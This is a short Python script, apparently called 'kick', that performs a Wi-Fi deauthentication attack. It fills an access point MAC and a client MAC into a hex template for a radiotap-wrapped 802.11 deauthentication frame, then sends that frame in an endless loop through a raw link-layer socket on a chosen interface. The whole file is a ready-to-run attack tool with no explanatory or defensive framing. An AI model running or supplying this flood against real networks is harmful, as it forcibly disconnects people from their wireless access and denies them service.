#!/usr/bin/env python3


'usage: kick <if> <wap> <sta>'


from socket import *
from sys import argv


template = '00000d00048002000200010000c0003a01{0}{1}{0}706a0100'


def mac(string):
    return string.replace(':', str())


def construct(wap, sta):

    string = template.format(mac(wap), mac(sta))
    packet = bytes.fromhex(string)

    return packet


def flood(iface, packet):
    # use a raw socket to transmit link layer.

    link = socket(AF_PACKET, SOCK_RAW, 0)
    link.bind((iface, 0))

    while True: 
        link.send(packet)


def start(iface, wap, sta):
    try:
        packet = construct(wap, sta)
        flood(iface, packet)

    except:
        return
        
        
def main():
    if len(argv) == 4:

        print('@ sending frames...')
        start(*argv[1:])
        
        print('@ stopped.')

    else:
        print(__doc__)


main()

